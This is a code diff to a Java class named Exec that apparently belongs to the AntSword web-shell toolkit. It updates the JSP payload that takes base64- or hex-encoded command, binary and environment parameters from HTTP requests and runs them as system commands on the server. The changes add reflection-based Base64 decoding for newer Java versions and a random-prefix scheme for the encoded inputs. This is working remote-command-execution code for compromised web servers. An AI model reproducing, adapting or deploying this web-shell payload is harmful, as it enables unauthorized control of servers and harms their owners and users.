@@ -9,20 +9,25 @@ import java.util.HashMap;
 import java.util.Map;
 
 public class Exec {
+    public String encoder;
+    public String cs;
+    public String randomPrefix;
+
     @Override
     public boolean equals(Object obj) {
         PageContext page = (PageContext) obj;
         ServletRequest request = page.getRequest();
         ServletResponse response = page.getResponse();
-        String encoder = request.getParameter("encoder") != null ? request.getParameter("encoder") : "";
-        String cs = request.getParameter("charset") != null ? request.getParameter("charset") : "UTF-8";
+        randomPrefix = "antswordrandomPrefix";
+        encoder = "base64";
+        cs = "antswordCharset";
         StringBuffer output = new StringBuffer("");
         StringBuffer sb = new StringBuffer("");
         String tag_s = "->|";
         String tag_e = "|<-";
-        String varkey1 = "antswordarg1";
-        String varkey2 = "antswordarg2";
-        String varkey3 = "antswordarg3";
+        String varkey1 = "antswordargbin";
+        String varkey2 = "antswordargcmd";
+        String varkey3 = "antswordargenv";
         try {
             response.setContentType("text/html");
             request.setCharacterEncoding(cs);
@@ -47,6 +52,13 @@ public class Exec {
     }
 
     String decode(String str, String encode, String cs) throws Exception {
+        int prefixlen = 0;
+        try {
+            prefixlen = Integer.parseInt(randomPrefix);
+            str = str.substring(prefixlen);
+        } catch (Exception e) {
+            prefixlen = 0;
+        }
         if (encode.equals("hex") || encode == "hex") {
             if (str == "null" || str.equals("null")) {
                 return "";
@@ -62,8 +74,17 @@ public class Exec {
             return baos.toString("UTF-8");
         } else if (encode.equals("base64") || encode == "base64") {
             byte[] bt = null;
-            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
-            bt = decoder.decodeBuffer(str);
+            String version = System.getProperty("java.version");
+            if (version.compareTo("1.9") >= 0) {
+                Class Base64 = Class.forName("java.util.Base64");
+                Object Decoder = Base64.getMethod("getDecoder", new Class[0]).invoke(Base64, new  Object[]{});
+                bt = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, str);   
+            } else {
+                Class Base64 = Class.forName("sun.misc.BASE64Decoder");
+                Object Decoder = Base64.getDeclaredConstructor().newInstance();
+                bt = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, str);
+            }
+            
             return new String(bt, "UTF-8");
         }
         return str;
@@ -77,7 +98,9 @@ public class Exec {
         String[] envs = envstr.split("\\|\\|\\|asline\\|\\|\\|");
         for (int i = 0; i < envs.length; i++) {
             String[] es = envs[i].split("\\|\\|\\|askey\\|\\|\\|");
-            cmdenv.put(es[0], es[1]);
+            if (es.length == 2){
+                cmdenv.put(es[0], es[1]);
+            }
         }
         String[] e = new String[cmdenv.size()];
         int i = 0;
